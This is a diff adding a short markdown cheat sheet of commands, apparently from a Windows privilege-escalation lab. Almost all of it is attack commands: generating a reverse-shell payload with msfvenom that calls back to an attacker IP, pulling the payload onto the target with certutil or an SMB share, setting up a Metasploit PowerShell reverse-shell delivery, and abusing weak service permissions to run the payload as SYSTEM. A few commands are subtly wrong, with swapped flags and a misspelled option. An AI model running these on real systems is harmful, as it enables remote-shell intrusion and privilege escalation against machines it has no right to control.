@@ -1,0 +1,37 @@
+# Commands
+
+xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.18.19
+
+
+msfvenom -p windows/x64/shell_reverse_tcp -o exe -f reverse.exe LHOST=10.18.112.115 LPORT=53
+
+# using python web server
+sudo python3 -m http.server 80
+# go to the windows box
+certutil -urlcache -f http://10.18.112.115/reverse.exe reverse.exe
+
+# using python smb server
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+
+# go to the windows box
+copy \\10.18.112.115\kali\reverse.exe C:\PrivEsc\reverse.exe
+
+
+# using metasploit
+msfconsole
+search web_delivery
+use exploit/multi/script/web_delivery
+set target PSH Binary
+set payload windows/powershell_reverse_tcp (stageless)
+set LHOSTS <attacker-ip>
+show advanced
+set PSH-EncodedCommand false
+exploit
+
+# service exploits - Insecure service permissions
+
+.\Accesschk.exe /accepteula -uwcqv user daclsvc
+sc qc daclsvc
+sc config binpath="\"C:\PrivEsc\reverse_system.exe\""
+net stop daclsvc
+net start daclsvc
